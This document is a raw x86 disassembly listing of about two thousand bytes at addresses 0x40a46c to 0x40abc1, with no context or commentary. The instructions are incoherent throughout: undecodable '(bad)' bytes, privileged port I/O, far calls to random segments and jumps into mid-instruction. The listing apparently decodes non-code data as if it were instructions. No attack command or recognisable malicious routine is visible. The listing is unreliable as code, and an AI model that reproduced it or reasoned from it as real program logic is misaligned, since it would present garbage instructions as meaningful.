  40a46c:	arpl   WORD PTR [ebx+0x0],dx
  40a46f:	push   ds
  40a470:	pop    es
  40a471:	or     DWORD PTR ds:0x62eb5c41,edi
  40a477:	mov    dl,0x39
  40a479:	add    cl,al
  40a47b:	xor    cl,cl
  40a47d:	cmc    
  40a47e:	sti    
  40a47f:	pushf  
  40a480:	cli    
  40a481:	and    edi,DWORD PTR [ebx+ebx*1-0x3f]
  40a485:	jnp    0x40a4a7
  40a487:	fistp  WORD PTR [edi+0x2e]
  40a48a:	jbe    0x40a4b5
  40a48c:	pop    ds
  40a48d:	(bad)
  40a490:	xchg   edx,eax
  40a491:	dec    eax
  40a492:	sbb    eax,0xc81fd04
  40a497:	shl    DWORD PTR [edx-0x1c],cl
  40a49a:	ficom  WORD PTR [ebx]
  40a49c:	out    dx,al
  40a49d:	push   esp
  40a49e:	rol    BYTE PTR [edx-0x35412e5f],0x9
  40a4a5:	sbb    DWORD PTR [ebx-0x125ad1ac],ebx
  40a4ab:	sbb    al,BYTE PTR [edx+0x52]
  40a4ae:	(bad)  
  40a4af:	cmc    
  40a4b0:	mov    bl,BYTE PTR [eax-0x56]
  40a4b3:	in     al,0xa
  40a4b5:	mov    esp,ecx
  40a4b7:	inc    edi
  40a4b8:	aaa    
  40a4b9:	outs   dx,BYTE PTR ds:[esi]
  40a4ba:	dec    ebx
  40a4bb:	sub    DWORD PTR [eax-0x55],edx
  40a4be:	adc    DWORD PTR [ecx-0x13],ecx
  40a4c1:	cmc    
  40a4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c3:	mov    WORD PTR [esi],cs
  40a4c5:	sbb    ah,BYTE PTR [esi-0x53]
  40a4c8:	cld    
  40a4c9:	pop    ss
  40a4ca:	leave  
  40a4cb:	add    edi,ecx
  40a4cd:	mov    eax,0xc2db1591
  40a4d2:	(bad)  
  40a4d3:	sub    al,0xcc
  40a4d5:	inc    edx
  40a4d6:	xchg   esi,eax
  40a4d7:	pop    ebp
  40a4d8:	pop    eax
  40a4d9:	inc    esp
  40a4da:	das    
  40a4db:	jb     0x40a546
  40a4dd:	cwde   
  40a4de:	sub    ecx,esp
  40a4e0:	push   ebp
  40a4e1:	add    al,0x28
  40a4e3:	cwde   
  40a4e4:	mov    es,esp
  40a4e6:	in     al,0x64
  40a4e8:	and    DWORD PTR [ecx],0xb
  40a4eb:	stos   DWORD PTR es:[edi],eax
  40a4ec:	mov    ds:0xa9328dd4,al
  40a4f1:	inc    edi
  40a4f2:	(bad)  
  40a4f4:	cmp    al,0x67
  40a4f6:	pushf  
  40a4f7:	mov    eax,0xa880d385
  40a4fc:	test   eax,0xa65aefb6
  40a501:	xor    eax,0xbd8935b7
  40a506:	test   DWORD PTR [edi+edx*1],esi
  40a509:	xor    al,0x89
  40a50b:	dec    cl
  40a50d:	icebp  
  40a50e:	call   0x36de:0x1c941964
  40a515:	scas   al,BYTE PTR es:[edi]
  40a516:	jmp    ebp
  40a518:	add    edi,DWORD PTR [ebp+0x22aaaa2c]
  40a51e:	mov    esp,0xa6914864
  40a523:	ins    BYTE PTR es:[edi],dx
  40a524:	sub    DWORD PTR [ebx+0x31fe09c4],0xa9f25437
  40a52e:	jle    0x40a527
  40a530:	daa    
  40a531:	ret    
  40a532:	test   BYTE PTR [esi],ah
  40a534:	fwait
  40a535:	ins    BYTE PTR es:[edi],dx
  40a536:	cwde   
  40a537:	xchg   DWORD PTR cs:[ebx-0x2c],edi
  40a53b:	aad    0xb8
  40a53d:	call   0xf48b:0xcdbe33de
  40a544:	push   edx
  40a545:	lea    ecx,[edx+0xb89b455]
  40a54b:	pop    esi
  40a54c:	mov    ecx,0x3a06bb1a
  40a551:	jle    0x40a5aa
  40a553:	loopne 0x40a553
  40a555:	cli    
  40a556:	or     edi,eax
  40a558:	rcr    DWORD PTR [edi-0x2e99bd52],0x5f
  40a55f:	lods   al,BYTE PTR ds:[esi]
  40a560:	pop    ebx
  40a561:	dec    ebp
  40a562:	and    eax,0x68c990a8
  40a567:	mov    eax,ds:0x49d69d3
  40a56c:	fcmovnu st,st(3)
  40a56e:	sub    ecx,eax
  40a570:	jl     0x40a514
  40a572:	cmp    eax,0x7e76deb2
  40a577:	lods   eax,DWORD PTR ds:[esi]
  40a578:	sti    
  40a579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a57a:	pop    ds
  40a57b:	arpl   WORD PTR ds:[eax+0x1e],dx
  40a57f:	(bad)  
  40a580:	mov    ecx,0x16f89e69
  40a585:	mov    ds,WORD PTR [edi]
  40a587:	fwait
  40a588:	add    dh,BYTE PTR [ebx-0x6d5999b2]
  40a58e:	jle    0x40a5aa
  40a590:	arpl   WORD PTR [edx+eiz*1-0x306dfe42],dx
  40a597:	imul   esp,edx,0x61
  40a59a:	jmp    0x8c236b52
  40a59f:	and    DWORD PTR [esi],esi
  40a5a1:	add    al,BYTE PTR [edi-0x3b]
  40a5a4:	lods   eax,DWORD PTR ds:[esi]
  40a5a5:	or     edi,DWORD PTR [edx-0x59]
  40a5a8:	les    ebp,FWORD PTR [eax]
  40a5aa:	fwait
  40a5ab:	imul   edi,DWORD PTR [esi+0x25],0x10cd759f
  40a5b2:	pop    ds
  40a5b3:	daa    
  40a5b4:	imul   esi,DWORD PTR [ecx],0xffffff93
  40a5b7:	fisttp DWORD PTR [edi]
  40a5b9:	mov    ecx,0x57950d80
  40a5be:	inc    edx
  40a5bf:	imul   ecx,DWORD PTR [ecx-0x6dd79eec],0x55ef1399
  40a5c9:	sbb    bl,0xfc
  40a5cc:	dec    eax
  40a5cd:	mov    bh,BYTE PTR [esi]
  40a5cf:	mov    ebx,0x895bb8d2
  40a5d4:	retf   0xcf15
  40a5d7:	mov    ch,0xe9
  40a5d9:	aas    
  40a5da:	mov    ch,0xb7
  40a5dc:	in     eax,dx
  40a5dd:	and    edi,DWORD PTR [ecx+0x4e]
  40a5e0:	xchg   BYTE PTR [ecx-0x15],bl
  40a5e3:	aaa    
  40a5e4:	push   cs
  40a5e5:	add    DWORD PTR [edi-0xc],esp
  40a5e8:	cmp    al,0xc7
  40a5ea:	cmp    dl,BYTE PTR [ebx+0x67]
  40a5ed:	pusha  
  40a5ee:	cwde   
  40a5ef:	call   0x78b30952
  40a5f4:	xchg   BYTE PTR [eax+esi*4],bh
  40a5f7:	dec    edi
  40a5f8:	stos   BYTE PTR es:[edi],al
  40a5f9:	cs jmp 0xca7e53a2
  40a5ff:	fiadd  DWORD PTR [ebx-0x2e]
  40a602:	pop    ebx
  40a603:	dec    ebp
  40a604:	mov    bh,0x8e
  40a606:	out    0x2,eax
  40a608:	js     0x40a648
  40a60a:	adc    DWORD PTR [edx],eax
  40a60c:	sar    DWORD PTR [ecx],0x25
  40a60f:	std    
  40a610:	xor    edx,esi
  40a612:	or     edx,esp
  40a614:	jle    0x40a64c
  40a616:	sub    eax,0xe76377b2
  40a61b:	xor    BYTE PTR [edx],ah
  40a61d:	add    BYTE PTR ds:0x4a84c873,dl
  40a623:	pop    eax
  40a624:	sub    DWORD PTR [edx+ebp*1-0x68],edx
  40a628:	rol    DWORD PTR [esi],0x2c
  40a62b:	out    dx,eax
  40a62c:	mov    bh,bh
  40a62e:	out    0x22,eax
  40a630:	xor    ecx,DWORD PTR [edx]
  40a632:	push   ebx
  40a633:	mov    gs,WORD PTR [edx-0x2254dba2]
  40a639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a63a:	(bad)  [esi+0x3fa8bac2]
  40a640:	nop
  40a641:	xor    ch,BYTE PTR [eax]
  40a643:	bound  edx,QWORD PTR [ecx-0x35]
  40a646:	add    bl,BYTE PTR [edi-0xbac343c]
  40a64c:	jge    0x40a5e4
  40a64e:	outs   dx,DWORD PTR ds:[esi]
  40a64f:	lock retf 
  40a651:	sbb    cl,BYTE PTR [ebx-0x53]
  40a654:	call   0xa43a:0xcad9f172
  40a65b:	pop    eax
  40a65c:	and    eax,0xffd56d1e
  40a662:	(bad)  
  40a663:	neg    BYTE PTR [ebx+0x7b]
  40a666:	jb     0x40a6c2
  40a668:	(bad)
  40a66c:	pushf  
  40a66d:	jle    0x40a613
  40a66f:	test   DWORD PTR [edx+0x45c4c44b],eax
  40a675:	mov    cl,0xfb
  40a677:	jno    0x40a60b
  40a679:	(bad)
  40a67c:	ins    BYTE PTR es:[edi],dx
  40a67d:	push   ecx
  40a67e:	fisub  DWORD PTR [ebp+0x24051e4]
  40a684:	lods   eax,DWORD PTR ds:[esi]
  40a685:	int3   
  40a686:	xchg   ecx,eax
  40a687:	jg     0x40a60d
  40a689:	xor    al,0x66
  40a68b:	pop    es
  40a68c:	jae    0x40a60f
  40a68e:	push   ecx
  40a68f:	push   edx
  40a690:	dec    esp
  40a691:	hlt    
  40a692:	ja     0x40a67c
  40a694:	(bad)  
  40a695:	dec    ebx
  40a696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a697:	or     eax,ebp
  40a699:	inc    eax
  40a69a:	and    esp,DWORD PTR [ecx]
  40a69c:	retf   0x351a
  40a69f:	out    0xed,al
  40a6a1:	xchg   edx,eax
  40a6a2:	fist   WORD PTR [edx-0x45]
  40a6a5:	ficom  WORD PTR [ecx+0x190098be]
  40a6ab:	xchg   DWORD PTR [ecx+ebp*8],edx
  40a6ae:	pop    ebx
  40a6af:	sbb    eax,0x5a687261
  40a6b4:	daa    
  40a6b5:	arpl   WORD PTR [ecx+0x7a],cx
  40a6b8:	pop    ss
  40a6b9:	sub    BYTE PTR [edx-0x2e50cf2a],bh
  40a6bf:	cmp    eax,0x8765f13
  40a6c4:	mov    BYTE PTR [ecx+0x76],ah
  40a6c7:	lods   eax,DWORD PTR ds:[esi]
  40a6c8:	sbb    ebx,ebp
  40a6ca:	inc    edi
  40a6cb:	enter  0x6c51,0x42
  40a6cf:	test   eax,0xdff40e64
  40a6d4:	scas   al,BYTE PTR es:[edi]
  40a6d5:	jge    0x40a6de
  40a6d7:	inc    edx
  40a6d8:	and    DWORD PTR [eax+eiz*4+0x2b],ebx
  40a6dc:	inc    edx
  40a6dd:	(bad)  
  40a6de:	lock sub al,ch
  40a6e1:	jg     0x40a695
  40a6e3:	mov    edx,0x3207d10a
  40a6e8:	in     al,0x2b
  40a6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6eb:	hlt    
  40a6ec:	ror    BYTE PTR [esi+ebp*2+0x48084957],cl
  40a6f3:	ja     0x40a732
  40a6f5:	mov    ?,WORD PTR [esi-0x18]
  40a6f8:	dec    ecx
  40a6f9:	dec    ebx
  40a6fa:	es sahf 
  40a6fc:	retf   
  40a6fd:	pop    ds
  40a6fe:	push   ebp
  40a6ff:	in     eax,dx
  40a700:	ins    DWORD PTR es:[edi],dx
  40a701:	jno    0x40a6ed
  40a703:	cmp    al,al
  40a705:	clc    
  40a706:	mov    al,0x1a
  40a708:	jae    0x40a6d3
  40a70a:	xchg   ebp,eax
  40a70b:	fucom  st(3)
  40a70d:	sbb    eax,0x84350c3
  40a712:	loopne 0x40a6f8
  40a714:	(bad)  
  40a715:	(bad)  
  40a716:	enter  0x6a3e,0x43
  40a71a:	ins    DWORD PTR es:[edi],dx
  40a71b:	inc    eax
  40a71c:	ja     0x40a703
  40a71e:	int3   
  40a71f:	xchg   BYTE PTR [eax],dl
  40a721:	popf   
  40a722:	call   0x8a449c4b
  40a727:	xchg   edi,eax
  40a728:	inc    ebx
  40a729:	fcomp  DWORD PTR [ebx]
  40a72b:	xchg   ebx,eax
  40a72c:	arpl   WORD PTR [eax+eax*8],ax
  40a72f:	jge    0x40a7ab
  40a731:	jae    0x40a78b
  40a733:	push   esi
  40a734:	retf   0xb703
  40a737:	rol    DWORD PTR [esi+0x38],0x7a
  40a73b:	add    esp,ecx
  40a73d:	stos   DWORD PTR es:[edi],eax
  40a73e:	xor    dh,BYTE PTR [esi]
  40a740:	or     eax,0xb267b4b2
  40a745:	repnz inc eax
  40a747:	out    0xa7,eax
  40a749:	and    al,0x81
  40a74b:	mov    dl,0x20
  40a74d:	add    ch,BYTE PTR [ecx-0x4b03053e]
  40a753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a754:	pop    ds
  40a755:	push   es
  40a756:	jno    0x40a73a
  40a758:	fstp   DWORD PTR [edi-0x34]
  40a75b:	and    DWORD PTR [edi-0x34],esp
  40a75e:	mov    bl,0xa9
  40a760:	hlt    
  40a761:	mov    edx,0x5d49ac1b
  40a766:	popf   
  40a767:	sub    ebx,ecx
  40a769:	inc    eax
  40a76a:	sub    DWORD PTR [esi+0x5e1d4fa6],0x2c
  40a771:	pushf  
  40a772:	out    0x9f,eax
  40a774:	and    ecx,edx
  40a776:	pop    ebp
  40a777:	mov    ah,0x98
  40a779:	mov    cl,0x14
  40a77b:	ficom  WORD PTR [ebx-0x51dd3e98]
  40a781:	xchg   ecx,eax
  40a782:	sbb    al,0x88
  40a784:	jns    0x40a764
  40a786:	mov    al,0x1e
  40a788:	jae    0x40a7b1
  40a78a:	leave  
  40a78b:	shr    BYTE PTR [ebx-0x80],1
  40a78e:	adc    al,0x24
  40a790:	pop    ds
  40a791:	arpl   WORD PTR [edx-0x7c],bx
  40a794:	aaa    
  40a795:	pop    ds
  40a796:	xchg   ebx,eax
  40a797:	pop    esi
  40a798:	dec    esp
  40a799:	cmp    DWORD PTR [edi],esi
  40a79b:	popf   
  40a79c:	les    eax,FWORD PTR [edi]
  40a79e:	dec    ebp
  40a79f:	leave  
  40a7a0:	add    DWORD PTR [edx],0x8
  40a7a3:	sti    
  40a7a4:	mov    al,ds:0x230ceedd
  40a7a9:	jae    0x40a7c8
  40a7ab:	daa    
  40a7ac:	pushf  
  40a7ad:	fs (bad) 
  40a7b0:	cmp    al,0x29
  40a7b2:	fadd   QWORD PTR [ebx+ebp*4-0x33fae6b6]
  40a7b9:	pop    esp
  40a7ba:	popf   
  40a7bb:	jmp    0x40a78e
  40a7bd:	cmp    DWORD PTR [ecx-0x58b5b21b],eax
  40a7c3:	lahf   
  40a7c4:	div    BYTE PTR [ebx+eax*2]
  40a7c7:	or     dh,BYTE PTR [esi]
  40a7c9:	push   esi
  40a7ca:	dec    edx
  40a7cb:	call   0x68ad5f11
  40a7d0:	sbb    eax,ecx
  40a7d2:	mov    dl,0x26
  40a7d4:	dec    edx
  40a7d5:	and    BYTE PTR [eax],bl
  40a7d7:	pop    ds
  40a7d8:	sub    BYTE PTR [edi+edi*2-0x3ffbb440],ch
  40a7df:	outs   dx,DWORD PTR ds:[esi]
  40a7e0:	int    0x83
  40a7e2:	inc    ecx
  40a7e3:	mov    ebx,0x759b0161
  40a7e8:	mov    ch,0x77
  40a7ea:	jae    0x40a80e
  40a7ec:	sbb    BYTE PTR [esi-0x4d],0xfa
  40a7f0:	(bad)  
  40a7f1:	aas    
  40a7f2:	sbb    cl,al
  40a7f4:	sbb    bl,BYTE PTR [esi+0x39c842f]
  40a7fa:	mov    ebx,0xd8d9d1a6
  40a7ff:	push   ebp
  40a800:	push   0x4572c186
  40a805:	sub    dl,bl
  40a807:	mov    eax,ds:0x8626c28c
  40a80c:	add    ch,dh
  40a80e:	pop    esi
  40a80f:	dec    ebx
  40a810:	mov    edx,0xf00d5353
  40a815:	jmp    0x2d6721ef
  40a81a:	push   0x6db2104b
  40a81f:	ds push es
  40a821:	mov    dl,0x4d
  40a823:	or     eax,0x21cf8e12
  40a828:	stos   BYTE PTR es:[edi],al
  40a829:	bound  ecx,QWORD PTR [esi]
  40a82b:	cmc    
  40a82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a82d:	mov    ds:0x427c051d,al
  40a832:	das    
  40a833:	jns    0x40a87b
  40a835:	ds (bad) 
  40a837:	mov    ds:0x38488ef3,al
  40a83c:	or     al,0x53
  40a83e:	xor    DWORD PTR [ebp+0x1be6e89a],0x8c0e5e7f
  40a848:	sbb    BYTE PTR [edi+0x49],0x36
  40a84c:	jno    0x40a82b
  40a84e:	sub    DWORD PTR [ebx+ebp*4-0x7e],esp
  40a852:	stos   DWORD PTR es:[edi],eax
  40a853:	cli    
  40a854:	xchg   BYTE PTR [ebp+0x7497f6da],dh
  40a85a:	dec    esp
  40a85b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a85c:	mov    ebp,0x5e49ef30
  40a861:	add    al,BYTE PTR [ebp*8+0x15f99781]
  40a868:	(bad)  
  40a869:	test   ah,ch
  40a86b:	push   cs
  40a86c:	iret   
  40a86d:	and    al,ch
  40a86f:	scas   eax,DWORD PTR es:[edi]
  40a870:	into   
  40a871:	mov    al,ds:0xd2d1c674
  40a876:	xor    edi,edi
  40a878:	lahf   
  40a879:	jne    0x40a844
  40a87b:	stos   BYTE PTR es:[edi],al
  40a87c:	ret    
  40a87d:	test   DWORD PTR [edi+0x1605eb57],esi
  40a883:	dec    ecx
  40a884:	imul   esp,eax,0xffffffb6
  40a887:	adc    edx,DWORD PTR [edi+0x23]
  40a88a:	imul   esp,ebp,0xa10beec4
  40a890:	jo     0x40a857
  40a892:	mov    ds:0x8251f310,eax
  40a897:	mov    bl,0x1b
  40a899:	jp     0x40a864
  40a89b:	out    0x6b,eax
  40a89d:	out    0x6,al
  40a89f:	xchg   ebp,eax
  40a8a0:	jne    0x40a8f4
  40a8a2:	jecxz  0x40a878
  40a8a4:	inc    ebx
  40a8a5:	xchg   ecx,eax
  40a8a6:	inc    esp
  40a8a7:	xchg   ah,bl
  40a8a9:	xchg   edx,eax
  40a8aa:	xchg   edx,eax
  40a8ab:	jl     0x40a8a6
  40a8ad:	std    
  40a8ae:	retf   0xead1
  40a8b1:	ja     0x40a8f6
  40a8b3:	jl     0x40a894
  40a8b5:	scas   al,BYTE PTR es:[edi]
  40a8b6:	and    al,ch
  40a8b8:	cmc    
  40a8b9:	cld    
  40a8ba:	lds    ebx,FWORD PTR [ebx]
  40a8bc:	mov    ebx,0x62ff4731
  40a8c1:	imul   esi,DWORD PTR [edx+0x38],0x21bd4e35
  40a8c8:	call   0x3a5f15af
  40a8cd:	sti    
  40a8ce:	cmp    BYTE PTR ds:0xd1e39eb9,0xb5
  40a8d5:	mov    edi,eax
  40a8d7:	pop    eax
  40a8d8:	fwait
  40a8d9:	in     al,dx
  40a8da:	pop    eax
  40a8db:	add    eax,0x46491ca2
  40a8e0:	cld    
  40a8e1:	or     edx,esp
  40a8e3:	sub    eax,0xd800e3c1
  40a8e8:	xchg   ebx,eax
  40a8e9:	in     al,dx
  40a8ea:	rcr    BYTE PTR [ebx-0x1a8aa2bf],1
  40a8f0:	pushf  
  40a8f1:	jae    0x40a930
  40a8f3:	test   ebp,0xbf2e57bd
  40a8f9:	addr16 or eax,0xf4693e33
  40a8ff:	sub    eax,0xb6778a39
  40a904:	pop    ebp
  40a905:	(bad)  
  40a906:	cwde   
  40a907:	inc    ebx
  40a908:	mov    ds:0xc1ba6f24,eax
  40a90d:	pushf  
  40a90e:	push   edi
  40a90f:	push   ebx
  40a910:	loopne 0x40a8a7
  40a912:	push   es
  40a913:	pop    esp
  40a914:	jo     0x40a993
  40a916:	out    0x36,al
  40a918:	out    0x4f,al
  40a91a:	(bad)  
  40a91b:	in     al,dx
  40a91c:	fld    DWORD PTR [ebp-0x6b]
  40a91f:	stos   DWORD PTR es:[edi],eax
  40a920:	stos   BYTE PTR es:[edi],al
  40a921:	or     esp,DWORD PTR [ebx-0x29]
  40a924:	mov    esi,0x59069e07
  40a929:	in     al,0xd7
  40a92b:	imul   ecx
  40a92d:	or     cl,al
  40a92f:	stos   BYTE PTR es:[edi],al
  40a930:	push   ebx
  40a931:	icebp  
  40a932:	repnz int3 
  40a934:	jns    0x40a951
  40a936:	sbb    DWORD PTR [eax+0x34],esi
  40a939:	xor    al,dl
  40a93b:	and    bh,BYTE PTR [esi]
  40a93d:	mov    ch,0xe0
  40a93f:	iret   
  40a940:	je     0x40a997
  40a942:	inc    esp
  40a943:	test   eax,0x2396b58a
  40a948:	mov    ds:0x9c017abf,eax
  40a94d:	cld    
  40a94e:	jl     0x40a9b6
  40a950:	jb     0x40a9c4
  40a952:	stos   BYTE PTR es:[edi],al
  40a953:	call   0x7ed6:0x68db8042
  40a95a:	xlat   BYTE PTR ds:[ebx]
  40a95b:	retf   0x3ad2
  40a95e:	pop    ebx
  40a95f:	repz push edi
  40a961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a962:	hlt    
  40a963:	push   0x48c0de6d
  40a968:	mov    esi,0xb1760789
  40a96d:	sbb    dl,BYTE PTR [edx+0x76b71bf]
  40a973:	adc    DWORD PTR [esi-0x47],edx
  40a976:	daa    
  40a977:	adc    ebp,DWORD PTR [edx+0x4d]
  40a97a:	dec    edi
  40a97b:	xor    al,0x49
  40a97d:	jmp    0xeb5c03bd
  40a982:	neg    BYTE PTR [esi-0x40f1b371]
  40a988:	cmp    ah,al
  40a98a:	cmp    eax,0xe6e63f61
  40a98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a990:	pop    ds
  40a991:	jge    0x40a9da
  40a993:	mov    dl,0xa6
  40a995:	mov    ds:0x619a2e0d,eax
  40a99a:	add    esi,DWORD PTR [ecx]
  40a99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a99d:	push   ebx
  40a99e:	xchg   edx,eax
  40a99f:	pop    edi
  40a9a0:	dec    BYTE PTR [ecx-0x10351cc7]
  40a9a6:	jo     0x40a9eb
  40a9a8:	in     al,0x51
  40a9aa:	out    0x6b,eax
  40a9ac:	mov    DWORD PTR [esi],ebx
  40a9ae:	pop    ss
  40a9af:	push   ebp
  40a9b0:	sbb    al,0xc1
  40a9b2:	shr    BYTE PTR [esi+0x69],0x5e
  40a9b6:	inc    ecx
  40a9b7:	stc    
  40a9b8:	push   ss
  40a9b9:	ficom  WORD PTR [eax-0x62]
  40a9bc:	ficomp WORD PTR [edx+0x454af3e7]
  40a9c2:	xchg   edx,eax
  40a9c3:	xor    al,0x59
  40a9c5:	mov    DWORD PTR [edx-0x74],ecx
  40a9c8:	adc    DWORD PTR [ecx+0x43cbd53d],ebp
  40a9ce:	in     eax,0x36
  40a9d0:	mov    eax,0xd3a28347
  40a9d5:	js     0x40a9ba
  40a9d7:	jb     0x40a9dd
  40a9d9:	and    DWORD PTR [esi+0x4db27b3e],ecx
  40a9df:	and    DWORD PTR [esi+0x757985c3],esp
  40a9e5:	scas   eax,DWORD PTR es:[edi]
  40a9e6:	sbb    DWORD PTR [ecx-0x48d0e5f0],esp
  40a9ec:	add    eax,0xe30ddae9
  40a9f1:	mov    esp,0x649fa97e
  40a9f6:	loope  0x40a9b1
  40a9f8:	cs mov ebp,0x5ba668cd
  40a9fe:	ins    DWORD PTR es:[edi],dx
  40a9ff:	sar    DWORD PTR [ecx-0xb],0x2f
  40aa03:	enter  0x2188,0x7c
  40aa07:	dec    edi
  40aa08:	add    DWORD PTR [ebp-0x67],ebp
  40aa0b:	retf   
  40aa0c:	in     eax,0x73
  40aa0e:	cmp    eax,0xa1c16211
  40aa13:	bound  esp,QWORD PTR [ebp+eiz*8+0x71]
  40aa17:	sub    edx,DWORD PTR [ecx+edi*1-0x2a]
  40aa1b:	popf   
  40aa1c:	sub    esp,DWORD PTR [eax-0x74]
  40aa1f:	xor    al,0xad
  40aa21:	test   BYTE PTR [eax+0x46699632],0xa3
  40aa28:	mov    ebp,0xe313b93b
  40aa2d:	in     eax,0xd3
  40aa2f:	pop    es
  40aa30:	pop    eax
  40aa31:	pop    ebp
  40aa32:	xchg   ebp,eax
  40aa33:	push   es
  40aa34:	xchg   ecx,eax
  40aa35:	std    
  40aa36:	xor    DWORD PTR [ecx+ebp*8-0x78],ecx
  40aa3a:	ins    DWORD PTR es:[edi],dx
  40aa3b:	sahf   
  40aa3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa3d:	stc    
  40aa3e:	fwait
  40aa3f:	jmp    0x1da5965f
  40aa44:	mov    ah,0x5
  40aa46:	imul   ebx,eax,0xef168675
  40aa4c:	fild   WORD PTR [edi-0x5088ebe]
  40aa52:	das    
  40aa53:	and    ebx,DWORD PTR [ebx+0x65]
  40aa56:	inc    eax
  40aa57:	cmp    edi,DWORD PTR [edi+0x72]
  40aa5a:	test   eax,0xcaa0bc9f
  40aa5f:	loop   0x40aa35
  40aa61:	mov    DWORD PTR [edi-0x24],ebp
  40aa64:	sub    BYTE PTR [edi-0x7f],ah
  40aa67:	lods   eax,DWORD PTR ds:[esi]
  40aa68:	xor    DWORD PTR [ebx+0xcd012b0],ebp
  40aa6e:	jno    0x40aa0c
  40aa70:	loopne 0x40aa62
  40aa72:	test   eax,0xaca38e22
  40aa77:	sbb    al,0x92
  40aa79:	in     al,dx
  40aa7a:	(bad)  
  40aa7c:	mov    edx,0x2eeea2af
  40aa81:	int3   
  40aa82:	arpl   sp,bp
  40aa84:	int    0x8
  40aa86:	not    DWORD PTR [eax+0xcf2465a]
  40aa8c:	and    DWORD PTR [edi+0x2530ba5f],ebx
  40aa92:	aad    0x19
  40aa94:	call   0x63f20d7d
  40aa99:	mov    eax,DWORD PTR [eax]
  40aa9b:	jbe    0x40aa34
  40aa9d:	cmp    DWORD PTR [ebp+0x76],ebp
  40aaa0:	ret    0x254a
  40aaa3:	mov    bh,bh
  40aaa5:	cmp    DWORD PTR [ebx*4-0x2273d19e],eax
  40aaac:	add    eax,0x4a7ce304
  40aab1:	mov    DWORD PTR [ecx],eax
  40aab3:	int3   
  40aab4:	mov    ecx,0xb6e8379d
  40aab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaba:	cmp    esi,ecx
  40aabc:	ss dec cx
  40aabf:	std    
  40aac0:	sbb    dl,0x22
  40aac3:	jne    0x40aa78
  40aac5:	mov    al,0xfe
  40aac7:	out    0x28,eax
  40aac9:	mov    al,ds:0x5d4bf919
  40aace:	repnz stos BYTE PTR es:[edi],al
  40aad0:	ins    BYTE PTR es:[edi],dx
  40aad1:	sbb    al,0xb6
  40aad3:	or     eax,0x115b9595
  40aad8:	out    0xc,al
  40aada:	sbb    BYTE PTR [ebx],al
  40aadc:	pop    edi
  40aadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aade:	sbb    ebp,edi
  40aae0:	(bad)  
  40aae1:	mov    dh,0x34
  40aae3:	dec    ebx
  40aae4:	push   0x10
  40aae6:	jno    0x40ab2b
  40aae8:	xchg   BYTE PTR [ecx],al
  40aaea:	sub    ecx,DWORD PTR [edx+0x655ea985]
  40aaf0:	out    0xfe,al
  40aaf2:	iret   
  40aaf3:	xchg   ebp,eax
  40aaf4:	mov    ebx,gs
  40aaf6:	popa   
  40aaf7:	fdiv   QWORD PTR [ebx+0x185b70a7]
  40aafd:	cmp    DWORD PTR [edi-0x7c4319ae],edi
  40ab03:	out    0x35,al
  40ab05:	jnp    0x40aa88
  40ab07:	mov    bh,0x51
  40ab09:	pop    es
  40ab0a:	fadd   st,st(6)
  40ab0c:	xor    bh,BYTE PTR [ecx+edx*1+0x30384569]
  40ab13:	test   al,0xec
  40ab15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab16:	dec    edx
  40ab17:	mov    BYTE PTR [edx-0x62],dl
  40ab1a:	jmp    0xa781:0xddcc948b
  40ab21:	push   esi
  40ab22:	(bad)  
  40ab23:	mov    bh,dh
  40ab25:	mov    bh,0x99
  40ab27:	push   0x996d0528
  40ab2c:	jge    0x40ab28
  40ab2e:	sub    al,BYTE PTR [si]
  40ab31:	jmp    0x40abad
  40ab33:	enter  0x5146,0x55
  40ab37:	stc    
  40ab38:	sbb    bl,BYTE PTR [edx+ecx*1-0x74ca8b3c]
  40ab3f:	cld    
  40ab40:	out    0x22,al
  40ab42:	data16 sbb BYTE PTR [eax],bl
  40ab45:	std    
  40ab46:	test   DWORD PTR [eax],edi
  40ab48:	inc    edi
  40ab49:	ror    BYTE PTR [ebp+0x16],1
  40ab4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab4d:	sub    al,0xec
  40ab4f:	dec    eax
  40ab50:	and    eax,0xc88ff5c8
  40ab55:	pop    esi
  40ab56:	loope  0x40abb9
  40ab58:	sbb    DWORD PTR [edi],esp
  40ab5a:	sbb    bh,BYTE PTR [ecx]
  40ab5c:	in     al,0x6f
  40ab5e:	mov    al,0x3b
  40ab60:	stc    
  40ab61:	mov    DWORD PTR [edi-0x380e3350],esi
  40ab67:	jns    0x40ab82
  40ab69:	outs   dx,BYTE PTR ds:[esi]
  40ab6a:	clc    
  40ab6b:	(bad)  
  40ab6c:	ja     0x40abbb
  40ab6e:	rol    DWORD PTR [edx+0x50d6bb7e],0x81
  40ab75:	xor    al,0x97
  40ab77:	pushf  
  40ab78:	je     0x40ab2c
  40ab7a:	inc    esp
  40ab7b:	xchg   ecx,eax
  40ab7c:	lods   eax,DWORD PTR ds:[esi]
  40ab7d:	or     al,0x97
  40ab7f:	cs xchg ch,ch
  40ab82:	and    DWORD PTR [edi],esp
  40ab84:	mov    ebx,0xc0465bd8
  40ab89:	loope  0x40ab0d
  40ab8b:	inc    edx
  40ab8c:	push   0x79d0220d
  40ab91:	add    BYTE PTR ds:0x3fcc3d73,0xde
  40ab98:	mov    eax,0xbd442549
  40ab9d:	in     al,0x98
  40ab9f:	add    eax,0xba8d8c42
  40aba4:	pop    es
  40aba5:	fadd   DWORD PTR [edi-0x7589a716]
  40abab:	test   BYTE PTR [edx*4-0x65a6cab6],0x88
  40abb3:	sub    eax,0xfff03890
  40abb8:	jle    0x40ab8d
  40abba:	jmp    0x19bb3299
  40abbf:	pop    edx
  40abc0:	stos   BYTE PTR es:[edi],al
  40abc1:	cmc    
